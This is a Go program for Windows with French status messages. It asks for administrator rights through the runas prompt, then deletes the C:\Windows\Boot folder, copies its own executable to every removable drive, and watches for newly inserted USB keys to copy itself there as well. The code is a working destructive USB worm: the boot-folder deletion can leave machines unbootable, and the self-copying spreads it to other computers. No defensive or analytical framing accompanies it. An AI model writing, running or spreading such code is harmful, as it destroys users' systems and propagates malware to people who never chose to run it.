package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	shell32  = syscall.NewLazyDLL("shell32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	getDriveTypeW    = kernel32.NewProc("GetDriveTypeW")
	shellExecuteW    = shell32.NewProc("ShellExecuteW")
	getMessage       = user32.NewProc("GetMessageW")
	translateMessage = user32.NewProc("TranslateMessage")
	dispatchMessage  = user32.NewProc("DispatchMessageW")
	openProcessToken = advapi32.NewProc("OpenProcessToken")
	getTokenInfo     = advapi32.NewProc("GetTokenInformation")
)

const (
	WM_DEVICECHANGE   = 0x0219
	DBT_DEVICEARRIVAL = 0x8000
	DBT_DEVTYP_VOLUME = 0x00000002
	DRIVE_REMOVABLE   = 2
	TOKEN_QUERY       = 0x0008
	TokenElevation    = 20
)

type DEV_BROADCAST_VOLUME struct {
	dbcvSize       uint32
	dbcvDevicetype uint32
	dbcvReserved   uint32
	dbcvUnitmask   uint32
	dbcvFlags      uint16
}

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct {
		X, Y int32
	}
}

type TOKEN_ELEVATION struct {
	TokenIsElevated uint32
}

func main() {
	if !isAdmin() {
		relaunchAsAdmin()
		return
	}

	folderToDelete := `C:\Windows\Boot`
	_ = os.RemoveAll(folderToDelete)

	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Erreur lors de la récupération du chemin:", err)
		return
	}

	fmt.Println("Copie vers les clés USB existantes...")
	copyToAllUSBs(exePath)

	fmt.Println("En attente de nouvelles clés USB...")
	// Écoute des messages système pour détecter les nouvelles clés USB
	var msg MSG
	for {
		ret, _, _ := getMessage.Call(
			uintptr(unsafe.Pointer(&msg)),
			0,
			0,
			0,
		)
		if ret == 0 {
			break
		}

		if msg.Message == WM_DEVICECHANGE {
			if msg.WParam == uintptr(DBT_DEVICEARRIVAL) {
				dev := (*DEV_BROADCAST_VOLUME)(unsafe.Pointer(msg.LParam))
				if dev != nil && dev.dbcvDevicetype == DBT_DEVTYP_VOLUME {
					for i := 0; i < 26; i++ {
						if dev.dbcvUnitmask&(1<<uint(i)) != 0 {
							drive := string(rune('A'+i)) + ":\\"
							fmt.Println("Nouvelle clé USB détectée:", drive)
							copyToDrive(exePath, drive)
						}
					}
				}
			}
		}
		translateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		dispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

func copyToAllUSBs(exePath string) {
	for letter := 'D'; letter <= 'Z'; letter++ {
		drive := string(letter) + ":\\"
		drivePtr, _ := syscall.UTF16PtrFromString(drive)

		ret, _, _ := getDriveTypeW.Call(uintptr(unsafe.Pointer(drivePtr)))

		if ret == DRIVE_REMOVABLE {
			fmt.Println("Clé USB trouvée:", drive)
			copyToDrive(exePath, drive)
		}
	}
}

func copyToDrive(exePath, drive string) {
	destFile := filepath.Join(drive, filepath.Base(exePath))
	err := copyFile(exePath, destFile)
	if err != nil {
		fmt.Println("Erreur lors de la copie vers", drive, ":", err)
	} else {
		fmt.Println("Copie réussie vers", destFile)
	}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func isAdmin() bool {
	var token syscall.Token
	proc, _ := syscall.GetCurrentProcess()

	ret, _, _ := openProcessToken.Call(
		uintptr(proc),
		TOKEN_QUERY,
		uintptr(unsafe.Pointer(&token)),
	)

	if ret == 0 {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(token))

	var elevation TOKEN_ELEVATION
	var returnLength uint32

	ret, _, _ = getTokenInfo.Call(
		uintptr(token),
		TokenElevation,
		uintptr(unsafe.Pointer(&elevation)),
		unsafe.Sizeof(elevation),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret == 0 {
		return false
	}

	return elevation.TokenIsElevated != 0
}

func relaunchAsAdmin() {
	exe, err := os.Executable()
	if err != nil {
		fmt.Println("Erreur:", err)
		return
	}

	verbPtr, _ := syscall.UTF16PtrFromString("runas")
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString("")

	ret, _, _ := shellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(verbPtr)),
		uintptr(unsafe.Pointer(exePtr)),
		0,
		uintptr(unsafe.Pointer(cwdPtr)),
		1, // SW_SHOWNORMAL
	)

	if ret > 32 {
		fmt.Println("Relancement en tant qu'administrateur...")
		os.Exit(0)
	} else {
		fmt.Println("Impossible de relancer en tant qu'administrateur")
	}
}
